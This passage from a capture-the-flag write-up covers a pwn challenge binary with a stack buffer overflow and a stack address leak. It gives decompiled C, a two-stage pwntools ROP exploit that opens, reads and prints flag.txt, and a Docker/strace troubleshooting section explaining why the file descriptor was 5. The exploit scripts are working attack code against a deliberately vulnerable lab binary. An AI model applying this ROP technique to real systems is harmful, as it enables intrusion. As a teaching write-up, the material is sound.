</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">__int64</span> buf[<span style="color:#ae81ff">2</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-20h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> fd; <span style="color:#75715e">// [rsp+34h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">banner</span>(argc, argv, envp);
</span></span><span style="display:flex;"><span>    buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    buf[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(fd, buf, <span style="color:#ae81ff">8uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[Strange man in mask screams some nonsense]: %s</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)buf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)s1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[Strange man in mask]: In order to proceed, tell us the secret phrase: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%16s&#34;</span>, s1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xE</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( s1[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        s1[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strncmp</span>(s1, <span style="color:#e6db74">&#34;s34s0nf1n4l3b00&#34;</span>, <span style="color:#ae81ff">0xFuLL</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">challenge_function</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[Strange man in mask]: Sorry, you are not allowed to enter here!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>The program opens up <code>/dev/random</code> at provides the user with 8 bytes of randomness</li>
<li>It asks for a secret phrase (compared with <code>s34s0nf1n4l3b00</code>), if the phrase matches
<ul>
<li>It calls <strong>challenge_function()</strong></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>challenge_function()</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">challenge_function</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-40h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [%p]&#34;</span>, buf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">[Strange man in mask]: Now, tell us a wish for next year: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdin);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(_bss_start);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[Strange man in mask]: That&#39;s a nice wish! Let the Spooktober Spirit be with you!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x54uLL</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>It discloses a stack address (of input buffer).</li>
<li>It reads 4096 bytes into a 64 byte array.</li>
</ul>
</li>
</ul>
<h2 id="vulnerability">Vulnerability</h2>
<p>As <code>NX</code> is enabled, but it is a No PIE binary, we can possibly ROP. <em>We also have stack address leak to store data</em> in our ropchain.</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="exploit-development">Exploit Development</h3>
<p>We do not have a <code>pop rdi ; ret</code> gadget, but the moment <strong>challenge_function()</strong> returns, RDX stores 0x54 which would suffice for us, if flag is larger in size we would have to read it in 84 byte chunks, <em>not an issue :)</em>.</p>
<p>The call to <strong>open()</strong> sets RDX to 0, so we return back to <strong>challenge_function()</strong> and send a second ropchain to read the flag from opened file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./challengeBinary&#34;</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(exe)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>process(exe)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;s34s0nf1n4l3b00&#34;</span>)   <span style="color:#75715e"># secret phrase</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [&#34;</span>)
</span></span><span style="display:flex;"><span>buffer_address <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>decode()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Buffer&#39;s stack address provided: </span><span style="color:#e6db74">{</span>hex(buffer_address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># GADGETS =====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011f2</span>
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011f4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>open_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010e0</span>
</span></span><span style="display:flex;"><span>read_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401090</span>
</span></span><span style="display:flex;"><span>write_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401050</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>   <span style="color:#75715e"># buffer size + RBP size</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ropchain_stage1 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (padding <span style="color:#f92672">-</span> len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(open_plt),      <span style="color:#75715e"># open(&#34;flag.txt&#34;, O_RDONLY), file descriptor returned for &#34;flag.txt&#34; would be 3 if program closed all the files it had opened before this call</span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;finale&#34;</span>])
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>})  <span style="color:#75715e"># call to open() sets RDX to 0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(ropchain_stage1)
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readrepeat(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ropchain_stage2 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    padding: [
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">3</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(read_plt),      <span style="color:#75715e"># read(3, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">1</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(write_plt),     <span style="color:#75715e"># write(stdout, buffer, 84)</span>
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(ropchain_stage2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;That&#39;s a nice wish! Let the Spooktober Spirit be with you!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;FLAG: </span><span style="color:#e6db74">{</span>proc<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>The script worked locally, but failed on remote instance.</p>
<h3 id="troubleshooting">Troubleshooting</h3>
<p>I made slight change to the Dockerfile to install <code>strace</code> and use it to trace my calls</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Dockerfile" data-lang="Dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">ubuntu:20.04</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> DEBIAN_FRONTEND noninteractive<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update --fix-missing <span style="color:#f92672">&amp;&amp;</span> apt-get -y upgrade<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get install -y socat strace<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> useradd -m ctf<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> challenge/* /home/ctf/<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chown -R ctf:ctf /home/ctf/<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span> <span style="color:#e6db74">/home/ctf</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">USER</span> <span style="color:#e6db74">ctf</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span> <span style="color:#e6db74">9001/tcp</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENTRYPOINT</span> [<span style="color:#e6db74">&#34;strace&#34;</span>, <span style="color:#e6db74">&#34;-f&#34;</span>, <span style="color:#e6db74">&#34;socat&#34;</span>, <span style="color:#e6db74">&#34;TCP-LISTEN:9001,fork&#34;</span>, <span style="color:#e6db74">&#34;EXEC:&#39;./challengeBinary&#39;&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>When I ran my exploit against the docker container, I observed that contrary to my assumption of fd being <code>3</code>, <strong>when flag.txt was opened it was assigned <code>5</code> fd number</strong>.</p>
<pre tabindex="0"><code>~$ docker run -it -p 9001:9001 --rm --name=challengeBinary challenge | grep open

openat(AT_FDCWD, &#34;/etc/ld.so.cache&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libwrap.so.0&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libutil.so.1&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libssl.so.1.1&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libcrypto.so.1.1&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libc.so.6&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libnsl.so.1&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libpthread.so.0&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libdl.so.2&#34;, O_RDONLY|O_CLOEXEC) = 3
[pid    11] openat(AT_FDCWD, &#34;/etc/ld.so.cache&#34;, O_RDONLY|O_CLOEXEC) = 5
[pid    11] openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libc.so.6&#34;, O_RDONLY|O_CLOEXEC) = 5
[pid    11] openat(AT_FDCWD, &#34;/dev/urandom&#34;, O_RDONLY &lt;unfinished ...&gt;
[pid    11] &lt;... openat resumed&gt;)       = 5
[pid    11] openat(AT_FDCWD, &#34;flag.txt&#34;, O_RDONLY &lt;unfinished ...&gt;
[pid    11] &lt;... openat resumed&gt;)       = 5
</code></pre><p>Updating the exploit script, it worked for remote instance</p>
<h3 id="final-exploit-script">Final exploit script</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./challengeBinary&#34;</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(exe)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>remote(<span style="color:#e6db74">&#34;83.136.251.168&#34;</span>, <span style="color:#ae81ff">39139</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;s34s0nf1n4l3b00&#34;</span>)   <span style="color:#75715e"># secret phrase</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [&#34;</span>)
</span></span><span style="display:flex;"><span>buffer_address <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>decode()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Buffer&#39;s stack address provided: </span><span style="color:#e6db74">{</span>hex(buffer_address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># GADGETS =====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011f2</span>
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011f4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>open_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010e0</span>
</span></span><span style="display:flex;"><span>read_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401090</span>
</span></span><span style="display:flex;"><span>write_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401050</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>   <span style="color:#75715e"># buffer size + RBP size</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ropchain_stage1 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (padding <span style="color:#f92672">-</span> len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(open_plt),      <span style="color:#75715e"># open(&#34;flag.txt&#34;, O_RDONLY), file descriptor returned for &#34;flag.txt&#34; 5 (found from troubleshooting)</span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;finale&#34;</span>])
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>})  <span style="color:#75715e"># call to open() sets RDX to 0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;exploit&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;s34s0nf1n4l3b00</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(ropchain_stage1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(ropchain_stage1)
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readrepeat(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ropchain_stage2 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    padding: [
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">5</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(read_plt),      <span style="color:#75715e"># read(5, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">1</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(write_plt),     <span style="color:#75715e"># write(stdout, buffer, 84)</span>
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(ropchain_stage2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;That&#39;s a nice wish! Let the Spooktober Spirit be with you!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;FLAG: </span><span style="color:#e6db74">{</span>proc<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><h3 id="digging-deeper">Digging deeper</h3>
<blockquote>
<p>Why did <strong>open()</strong> return <code>5</code>?</p>
</blockquote>
<p>Upon reading through strace logs, I found that socat registered <strong>3</strong>, <strong>4</strong> for socketpair (<em>socketpair are 2 file descriptors used for inter-process communication, they are bi-directional in nature. Usually before forking a process creates a pair and then parent and child use one fd from the pair for read/write while close the other</em>), while <strong>5</strong> was used for socket connection, and the newly created conenction was assigned <strong>6</strong>.</p>
<pre tabindex="0"><code>socketpair(AF_UNIX, SOCK_DGRAM, 0, [3, 4]) = 0
...
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 5
bind(5, {sa_family=AF_INET, sin_port=htons(9001), sin_addr=inet_addr(&#34;0.0.0.0&#34;)}, 16) = 0
getsockname(5, {sa_family=AF_INET, sin_port=htons(9001), sin_addr=inet_addr(&#34;0.0.0.0&#34;)}, [16]) = 0
listen(5, 5) 
...
accept(5, {sa_family=AF_INET, sin_port=htons(42340), sin_addr=inet_addr(&#34;172.17.0.1&#34;)}, [16]) = 6
</code></pre><p>Once I run my exploit, 2 new processes are created PID <code>9</code>, <code>10</code></p>
